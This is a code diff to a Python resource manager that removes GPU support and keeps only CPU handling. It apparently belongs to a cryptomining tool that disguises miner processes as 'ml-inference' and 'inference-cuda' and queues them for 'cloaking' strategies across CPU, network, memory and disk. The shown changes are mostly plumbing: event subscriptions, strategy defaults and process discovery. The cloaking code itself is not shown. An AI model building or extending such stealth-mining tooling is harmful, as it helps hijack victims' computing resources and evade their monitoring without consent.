@@ -111,41 +111,12 @@ class SharedResourceManager:
             return 0.0
 
     def get_gpu_usage_percent(self, pid: int) -> float:
-        try:
-            return self._sync_get_gpu_usage_percent(pid)
-        except Exception as e:
-            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
-            return 0.0
+        # (CPU-only) Luôn trả về 0.0
+        return 0.0
 
     def _sync_get_gpu_usage_percent(self, pid: int) -> float:
-        try:
-            if not self.is_nvml_initialized():
-                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
-                self.initialize_nvml()
-
-            if not self._nvml_init:
-                return 0.0
-
-            device_count = pynvml.nvmlDeviceGetCount()
-            total_gpu_usage = 0.0
-            gpu_present = False
-
-            for i in range(device_count):
-                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
-                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
-                for proc in procs:
-                    if proc.pid == pid:
-                        gpu_present = True
-                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
-                        total_gpu_usage += utilization.gpu
-
-            return total_gpu_usage if gpu_present else 0.0
-        except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
-            return 0.0
-        except Exception as e:
-            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
-            return 0.0
+        # (CPU-only) Luôn trả về 0.0
+        return 0.0
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
@@ -267,8 +238,8 @@ class ResourceManager(IResourceManager):
             
             # ✅ VALIDATION 1: Check process priority map
             if not hasattr(config, 'process_priority_map'):
-                self.logger.warning("⚠️ Missing process_priority_map - using defaults")
-                config.process_priority_map = {'ml-inference': 1, 'inference-cuda': 2}
+                self.logger.warning("⚠️ Missing process_priority_map - using defaults (CPU-only)")
+                config.process_priority_map = {'ml-inference': 1}
             
             # ✅ VALIDATION 2: Validate priority values
             for process_name, priority in config.process_priority_map.items():
@@ -282,7 +253,6 @@ class ResourceManager(IResourceManager):
                 self.logger.warning("⚠️ No cloaking strategies configured - using defaults")
                 default_strategies = {
                     'cpu_cloaking': {'enabled': True},
-                    'gpu_cloaking': {'enabled': True},
                     'network': {'enabled': True},
                     'memory': {'enabled': True}
                 }
@@ -294,7 +264,7 @@ class ResourceManager(IResourceManager):
             
             # ✅ VALIDATION 4: Validate strategy configurations
             if cloaking_strategies:
-                required_strategies = ['cpu_cloaking', 'gpu_cloaking']
+                required_strategies = ['cpu_cloaking']
                 for strategy in required_strategies:
                     if strategy not in cloaking_strategies:
                         self.logger.warning(f"⚠️ Missing required strategy '{strategy}' - enabling by default")
@@ -336,10 +306,8 @@ class ResourceManager(IResourceManager):
             raise ValueError(error_msg) from e
 
     def is_gpu_initialized(self) -> bool:
-        """
-        Kiểm tra xem GPU (NVML) đã được khởi tạo hay chưa.
-        """
-        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()
+        """(CPU-only) Luôn False."""
+        return False
 
     def handle_resource_adjustment(self, event_data: Dict[str, Any]):
         """
@@ -362,8 +330,7 @@ class ResourceManager(IResourceManager):
             # ✅ CORE: Subscribe to mining events only - **FIXED EVENT NAMES** (tên sự kiện đã sửa)
             self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:cpu_pid_registered event")
             self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_mining_event)
-            self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:gpu_pid_registered event")
-            self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_mining_event)
+            # (CPU-only) Bỏ qua đăng ký GPU events
             
             self.event_bus.start_listening()
             self.logger.info("✅ EventBus subscriptions established successfully")
@@ -433,48 +400,9 @@ class ResourceManager(IResourceManager):
                 self.logger.error(f"Failed to publish error event: {pub_error}")
 
     def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
-        """Handle GPU mining events - PID Propagation Flow Step 2 - **UPDATED FOR NEW EVENT FORMAT** (cập nhật cho định dạng sự kiện mới)"""
-        try:
-            # ✅ FIXED: Updated to match start_mining.py payload structure
-            pid = payload.get('pid')
-            process_name = payload.get('process_name', 'inference-cuda')
-            status = payload.get('status')
-            
-            if pid and status == 'running':
-                self.logger.info(f"🎮 ResourceManager received GPU PID registered: PID={pid}")
-                self.logger.debug(f"[DEBUG] GPU event payload: {payload}")
-                
-                # ✅ ENHANCED: Create MiningProcess với explicit classification
-                mining_process = MiningProcess(pid, process_name, is_gpu=True)  # Explicit GPU
-                self.logger.debug(f"[DEBUG] Created MiningProcess: {mining_process}")
-                
-                # Add to tracking list
-                with self.mining_processes_lock:
-                    self.mining_processes.append(mining_process)
-                    self.logger.debug(f"[DEBUG] Added to mining_processes list. Total: {len(self.mining_processes)}")
-                
-                # ✅ STREAMLINED: Enqueue GPU cloaking
-                self.logger.debug(f"[DEBUG] Calling enqueue_cloaking for GPU PID {pid}")
-                self.enqueue_cloaking(mining_process)
-                
-                self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
-                
-        except Exception as e:
-            error_msg = f"❌ Error handling GPU mining event: {e}"
-            self.logger.error(error_msg)
-            
-            # ✅ ENHANCED: Error propagation through EventBus
-            try:
-                if self.event_bus:
-                    self.event_bus.publish('resource_manager:gpu_event_error', {
-                        'error_type': 'gpu_event_handling_failed', 
-                        'error_message': str(e),
-                        'payload': payload,
-                        'timestamp': time.time(),
-                        'severity': 'high'
-                    })
-            except Exception as pub_error:
-                self.logger.error(f"Failed to publish error event: {pub_error}")
+        """(CPU-only) GPU events bị vô hiệu hóa."""
+        self.logger.info("[CPU-only] Ignoring GPU mining event.")
+        return
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
@@ -497,11 +425,11 @@ class ResourceManager(IResourceManager):
             
             # ✅ DIRECT ACCESS: Get type từ enhanced MiningProcess
             process_type = process.get_process_type()
-            is_gpu = process.is_gpu_process()
+            is_gpu = False
             strategy_hints = process.get_strategy_hints()
             
             # ✅ COMPREHENSIVE STRATEGY ASSIGNMENT: Multi-dimensional cloaking
-            primary_strategy = 'gpu_cloaking' if is_gpu else 'cpu_cloaking'
+            primary_strategy = 'cpu_cloaking'
             
             # ✅ CONFIGURABLE ADDITIONAL STRATEGIES: Based on config and process type
             additional_strategies = self._get_additional_strategies(process_type, strategy_hints)
@@ -625,7 +553,7 @@ class ResourceManager(IResourceManager):
             # ✅ SYSTEM-BASED AVAILABILITY: Check system capabilities
             availability_checks = {
                 'cpu_cloaking': True,  # Always available
-                'gpu_cloaking': self.is_gpu_initialized(),  # Requires GPU
+                # 'gpu_cloaking': False (CPU-only)
                 'network': self._check_network_availability(),
                 'disk_io': self._check_disk_io_availability(), 
                 'cache': self._check_cache_availability(),
@@ -734,8 +662,7 @@ class ResourceManager(IResourceManager):
         import psutil
         
         target_processes = {
-            'ml-inference': False,  # CPU mining
-            'inference-cuda': True  # GPU mining  
+            'ml-inference': False  # CPU mining only
         }
         
         discovered_count = 0
